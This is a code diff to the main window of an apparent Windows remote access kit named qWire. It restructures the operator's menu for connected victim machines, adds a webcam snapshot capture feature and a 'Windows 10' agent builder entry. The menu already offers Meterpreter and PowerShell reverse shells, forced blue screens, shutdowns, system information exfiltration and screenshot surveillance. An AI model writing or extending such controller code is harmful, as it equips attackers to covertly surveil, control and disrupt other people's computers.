@@ -10,33 +10,35 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.2
+# Build:  1.0.21
 # -------------------------------------------------------------
+import os
+
 from PyQt5 import QtCore, QtGui, QtWidgets
 from PyQt5.Qt import Qt
 from PyQt5.QtWidgets import QWidget,QMenu,QAbstractItemView
 from PyQt5.QtCore import QEvent
 
-from ..logging.logging import LoggingUtilitys,NetworkingConfigs,ClientWindow,ConsoleWindow
-from ..Qt5.settings_window import Ui_settings_window
-from ..Qt5.ListenerGUI import Ui_ListenerGUI
-from ..Qt5.sysinfo_window import Ui_host_info_window
-from ..Qt5.info_window import Ui_information_window
-from ..Qt5.screenshot_window import Ui_screenshot_window
-from ..Qt5.agent_builder_window import Ui_builder_dialog
-from ..Qt5.update_log_window import Ui_update_log_window
-from ..Qt5.task_manager_window import Ui_task_manager_dialog
-from ..Qt5.icons import IconObj,ImageObj,PixmapObj
-from ..utils.file_paths import BGPath
-from ..utils.file_paths import DSFilePath
-from ..networking.dns_handler import DomainHandler
-from ..networking.socket import Utilitys
-
-from ..client_handling.shell import Meterpreter,SystemShell
-from ..client_handling.networking import NetHandle
-from ..client_handling.enumeration import SystemCommands
-from ..client_handling.system import SystemManager
-from ..client_handling.surveillance import Streaming
+from core.logging.logging import LoggingUtilitys,NetworkingConfigs,ClientWindow,ConsoleWindow
+from core.Qt5.settings_gui.settings_window import Ui_settings_window
+from core.Qt5.misc_gui.ListenerGUI import Ui_ListenerGUI
+from core.Qt5.misc_gui.sysinfo_window import Ui_host_info_window
+from core.Qt5.misc_gui.info_window import Ui_information_window
+from core.Qt5.handling_guis.image_display_window import Ui_image_data_window
+from core.Qt5.builder_guis.windows10.agent_builder_window import Ui_builder_dialog
+from core.Qt5.misc_gui.update_log_window import Ui_update_log_window
+from core.Qt5.handling_guis.task_manager_window import Ui_task_manager_dialog
+from core.Qt5.icons import IconObj,ImageObj,PixmapObj
+from core.utils.file_paths import BGPath
+from core.utils.file_paths import DSFilePath
+from core.networking.utils.dns_handler import DomainHandler
+from core.networking.sockets.server_socket import Utilitys
+from core.threading.threads import ProcessRunnable
+from core.client_handling.shell import Meterpreter,SystemShell
+from core.client_handling.networking import NetHandle
+from core.client_handling.enumeration import SystemCommands
+from core.client_handling.system import SystemManager
+from core.client_handling.surveillance import Streaming
 
 from time import sleep
 from os.path import exists
@@ -46,20 +48,7 @@ listening_ports_array = []
 active_connections_array = []
 listening_sockets_array = []
 
-BUILD_VERSION = '1.0.2'
-
-#Thread for running background tasks. Qt does not run well with the pythons threading libs
-class ProcessRunnable(QtCore.QRunnable):
-    def __init__(self, target, args):
-        QtCore.QRunnable.__init__(self)
-        self.t = target
-        self.args = args
-
-    def run(self):
-        self.t()
-
-    def start(self):
-        QtCore.QThreadPool.globalInstance().start(self)
+BUILD_VERSION = '1.0.21'
 
 class Ui_main_window(QWidget):
 
@@ -194,6 +183,11 @@ class Ui_main_window(QWidget):
 
     #Function creates context menu when client is right clicked in the list. Used to interact with client
     def eventFilter(self,source,event):
+        """
+        Define a series of internal functions to extract required parameters for
+        interacting with the client
+        """
+
         #Internal function to get clients encryption key
         def get_key_from_row():
             row = self.active_connections_list.currentRow()                     #Retrieve socket from array based on position in client sock array
@@ -212,47 +206,107 @@ class Ui_main_window(QWidget):
             Utilitys().remove_socket_from_array(socket_index)               #Remove the client socket object from the array with the row number
 
         if event.type() == QEvent.ContextMenu and source is self.active_connections_list and self.active_connections_list.currentRow() > -1:   #If event is left click and the source is the active connections list
-                                                                                                                                               #And there is a connection in the row
-
+            """
+            Define context menu object
+            """                                                                                                                           #And there is a connection in the row
             context_menu = QMenu(self)                  #Create Menu Object
+            """
+            Create root submenus on the main menu
+            """
             networking_menu = context_menu.addMenu('Networking')        #Create networking submenu
-            networking_menu.setIcon(IconObj().net_icon)                           #Add Icon to networking menu
-            ping_client = networking_menu.addAction('Ping')             #Add ping action to networking menu
-            ping_client.setIcon(IconObj().ping_icon)                              #Ping Icon
+            shells_menu = context_menu.addMenu('Shells')  # Create Shells Sub menu
+            sys_manager_menu = context_menu.addMenu('System')  # Add system functions menu
+            enumeration_menu = context_menu.addMenu('Enumeration')  # Enumeration menu
+            surveillance_menu = context_menu.addMenu('Surveillance')  # Add surveillance menu
+            """
+            Add sub-menus to root sub-menus
+            """
+            #NETWORKING MENU
+            #(none)
+
+            #SHELLS MENU
+            meterpreter_menu = shells_menu.addMenu('Meterpreter')       #Add meterpreter sub menu to shells sub menu
+            system_menu = shells_menu.addMenu('System')  # Add system shells sub menu to sub menu
+
+            #SYSTEM MANAGER MENU
+            #(none)
+
+            #ENUMERATION MENU
+            #(none)
+
+            #SURVEILLANCE MENU
+            desktop_menu = surveillance_menu.addMenu('Desktop')
+            webcam_menu = surveillance_menu.addMenu('Webcam')
+            """
+            Add actions items to menus
+            """
+            #NETWORKING MENU
+            ping_client = networking_menu.addAction('Ping')  # Add ping action to networking menu
             reconnect_action = networking_menu.addAction('Reconnect')   #Add reconnect action
             disconnect_action = networking_menu.addAction('Disconnect') #Add disconnect action
+
+            #SHELLS MENU
+                #METERPRETER MENU
+            python_meterpreter = meterpreter_menu.addAction('Python')  # Add python meterpreter action to shells sub menu
+                #SYSTEM MENU
+            CMD_shell = system_menu.addAction('CMD Shell')  # Add Command shell action to system shells menu
+            powershell_shell = system_menu.addAction('PowerShell')  # Add powershell reverse shell to submenu
+
+            #SYSTEM MANAGER MENU
+            blue_screen = sys_manager_menu.addAction('BSoD')  # Add blue screen to sys functions menu
+            reboot_client = sys_manager_menu.addAction('Reboot')  # Add reboot client function
+            shutdown_client = sys_manager_menu.addAction('Shutdown')  # Shutdown client option
+
+            #ENUMERATION MENU
+            system_info = enumeration_menu.addAction('System Info')     #System Information exfiltration
+            get_client_process = enumeration_menu.addAction('Task Manager') #Task Manager
+
+            #SURVEILLANCE MENU
+                #DESKTOP MENU
+            screenshot = desktop_menu.addAction('Screenshot')  # Screenshot action
+                #WEBCAM MENU
+            snapshot = webcam_menu.addAction('Snapshot')
+            """
+            Assemble Icons for menus and action items
+            """
+            #NETWORKING MENU
+            networking_menu.setIcon(IconObj().net_icon)                           #Add Icon to networking menu
+            ping_client.setIcon(IconObj().ping_icon)                              #Ping Icon
             disconnect_action.setIcon(IconObj().disconnect_icon)        #Add Icon
             reconnect_action.setIcon(IconObj().reconnect_icon)                    #Add icon to reconnect action
-            shells_menu = context_menu.addMenu('Shells')                #Create Shells Sub menu
+
+            #SHELLS MENU
             shells_menu.setIcon(IconObj().shells_icon)                            #Create shells menu icon
-            meterpreter_menu = shells_menu.addMenu('Meterpreter')       #Add meterpreter sub menu to shells sub menu
+                #METERPRETER MENU
             meterpreter_menu.setIcon(IconObj().msf_icon)                          #Add icon to meterpreter menu
-            python_meterpreter = meterpreter_menu.addAction('Python')   #Add python meterpreter action to shells sub menu
             python_meterpreter.setIcon(IconObj().python_icon)                     #Add python icon to python meterpreter
-            system_menu = shells_menu.addMenu('System')                 #Add system shells sub menu to sub menu
+                #SYSTEM MENU
             system_menu.setIcon(IconObj().system_icon)                               #Add icon to system shells menu
-            powershell_shell = system_menu.addAction('PowerShell')      #Add powershell reverse shell to submenu
             powershell_shell.setIcon(IconObj().ps_shell_icon)                     #Add icon to powershell shell option
-            sys_manager_menu = context_menu.addMenu('System')           #Add system functions menu
-            sys_manager_menu.setIcon(IconObj().system_icon)                          #Add icon to system functions menu
-            blue_screen = sys_manager_menu.addAction('BSoD')            #Add blue screen to sys functions menu
-            blue_screen.setIcon(IconObj().bsod_icon)                              #Icon
-            reboot_client = sys_manager_menu.addAction('Reboot')        #Add reboot client function
-            reboot_client.setIcon(IconObj().reconnect_icon)                       #Reuse reconnect icon
-            shutdown_client = sys_manager_menu.addAction('Shutdown')    #Shutdown client option
-            shutdown_client.setIcon(IconObj().shutdown_icon)                      #Icon
-            enumeration_menu = context_menu.addMenu('Enumeration')      #Enumeration menu
-            enumeration_menu.setIcon(IconObj().magn_glass_icon)                   #Icon
-            system_info = enumeration_menu.addAction('System Info')     #System Information exfiltration
-            system_info.setIcon(IconObj().system_icon)                  #Icon
-            get_client_process = enumeration_menu.addAction('Task Manager') #Task Manager
-            get_client_process.setIcon(IconObj().task_manager_icon)     #Icon
-            surveillance_menu = context_menu.addMenu('Surveillance')    #Add surveillance menu
-            surveillance_menu.setIcon(IconObj().surveillance_icon)      #Icon
-            screenshot = surveillance_menu.addAction('Screenshot')      #Screenshot action
-            screenshot.setIcon(IconObj().screenshot_icon)               #Icon
-            CMD_shell = system_menu.addAction('CMD Shell')              #Add Command shell action to system shells menu
             CMD_shell.setIcon(IconObj().cmd_shell_icon)
+
+            #SYSTEM MANAGER MENU
+            sys_manager_menu.setIcon(IconObj().system_icon)                          #Add icon to system functions menu
+            blue_screen.setIcon(IconObj().bsod_icon)                              #Icon
+            reboot_client.setIcon(IconObj().reconnect_icon)                       #Reuse reconnect icon
+            shutdown_client.setIcon(IconObj().shutdown_icon)                      #Icon
+
+            #ENUMERATION MENU
+            enumeration_menu.setIcon(IconObj().magn_glass_icon)                   #Icon
+            system_info.setIcon(IconObj().system_icon)                  #Icon
+            get_client_process.setIcon(IconObj().task_manager_icon)     #Icon
+
+            #SURVEILLANCE MENU
+            surveillance_menu.setIcon(IconObj().surveillance_icon)      #IcoN
+                #DESKTOP MENU
+            desktop_menu.setIcon(IconObj().system_icon)
+            screenshot.setIcon(IconObj().screenshot_icon)               #Icon
+                #WEBCAM MENU
+            webcam_menu.setIcon(IconObj().webcam_icon)
+            snapshot.setIcon(IconObj().screenshot_icon)
+            """
+            Assign functions to actions 
+            """
             action = context_menu.exec_(self.mapToGlobal(event.globalPos()))    #Define the click action bool for the menu
 
             if action == python_meterpreter:                            #If python meterpreter is clicked
@@ -311,8 +365,9 @@ class Ui_main_window(QWidget):
             if action == screenshot:
                 ConsoleWindow().log_to_console('Capturing screenshot from client') #Log to console
                 Streaming().get_client_screenshot(get_key_from_row(),get_client_socket_obj())   #Get screenshot
-                self.open_new_window(Ui_screenshot_window)              #Open window with photo
-                ConsoleWindow().log_to_console('Received screenshot')   #Log to console
+                ConsoleWindow().log_to_console('Received screenshot')  # Log to console
+                self.open_new_window(Ui_image_data_window)              #Open window with photo
+                #os.remove(DSFilePath().streaming_frame)
 
             if action == disconnect_action:                             #If action is to disconnect client
                 ConsoleWindow().log_to_console('Disconnecting client')  #Log to console
@@ -329,10 +384,22 @@ class Ui_main_window(QWidget):
                         break                                           #Break the loop
                 self.open_client_compatible_window(Ui_task_manager_dialog,get_client_socket_obj(),get_key_from_row())   #Open the task manager window
 
+            if action == snapshot:
+                ConsoleWindow().log_to_console('Paging client for webcam')
+                if Streaming().get_client_snapshot(get_key_from_row(),get_client_socket_obj()) == True:
+                    self.open_new_window(Ui_image_data_window)
+                    #os.remove(DSFilePath().streaming_frame)
+                else:
+                    ConsoleWindow().log_to_console('Failed to receive snapshot from client. Camera likely does not exist.')
+
+
             return True
         return super().eventFilter(source, event)
 
     def setupUi(self, main_window):
+        """
+        Define UI parameters
+        """
         main_window.setObjectName("main_window")
         main_window.resize(1574, 784)                           #Change main window size
         main_window.setWindowIcon(IconObj().main_window_icon)  #Set main window icon
@@ -398,6 +465,9 @@ class Ui_main_window(QWidget):
         self.builder_menu = QtWidgets.QMenu(self.main_menu_bar)
         self.builder_menu.setObjectName("builder_menu")
         self.builder_menu.setIcon(IconObj().builder_icon)
+        self.windows_menu = self.builder_menu.addMenu('Windows')
+        self.windows_menu.setObjectName("windows_menu")
+        self.windows_menu.setIcon(IconObj().microsoft_logo_icon)
         self.settings_menu = QtWidgets.QMenu(self.main_menu_bar)
         self.settings_menu.setObjectName("settings_menu")
         self.settings_menu.setIcon(IconObj().settings_icon)
@@ -414,9 +484,9 @@ class Ui_main_window(QWidget):
         self.update_logs = QtWidgets.QAction(main_window,triggered=lambda: self.open_new_window(Ui_update_log_window))
         self.update_logs.setObjectName("update_logs")
         self.update_logs.setIcon(IconObj().update_log_icon)
-        self.agent_builder = QtWidgets.QAction(main_window,triggered=lambda: self.open_new_window(Ui_builder_dialog))
-        self.agent_builder.setObjectName("agent_builder")
-        self.agent_builder.setIcon(IconObj().builder_icon)
+        self.windows_10_agent = QtWidgets.QAction(main_window, triggered=lambda: self.open_new_window(Ui_builder_dialog))
+        self.windows_10_agent.setObjectName("windows_10_agent")
+        self.windows_10_agent.setIcon(IconObj().windows_10_logo)
         self.qwire_settings = QtWidgets.QAction(main_window,triggered=lambda: self.open_new_window(Ui_settings_window))
         self.qwire_settings.setObjectName("qwire_settings")
         self.qwire_settings.setIcon(IconObj().settings_icon)
@@ -424,7 +494,7 @@ class Ui_main_window(QWidget):
         self.network_menu.addAction(self.update_dns)
         self.about_menu.addAction(self.version_info)
         self.about_menu.addAction(self.update_logs)
-        self.builder_menu.addAction(self.agent_builder)
+        self.windows_menu.addAction(self.windows_10_agent)
         self.settings_menu.addAction(self.qwire_settings)
         self.main_menu_bar.addAction(self.network_menu.menuAction())
         self.main_menu_bar.addAction(self.builder_menu.menuAction())
@@ -522,7 +592,7 @@ class Ui_main_window(QWidget):
         self.update_dns.setText(_translate("main_window", "Update DNS"))
         self.version_info.setText(_translate("main_window", "Version Info"))
         self.update_logs.setText(_translate("main_window", "Update Log"))
-        self.agent_builder.setText(_translate("main_window", "Agent Builder"))
+        self.windows_10_agent.setText(_translate("main_window", "Windows 10"))
         self.qwire_settings.setText(_translate("main_window", "qWire Settings"))
         self.connections_label.setText(_translate("main_window", "Connections: 0"))
         self.data_label.setText(_translate("main_window", "Data tx/rx: 0\\b"))
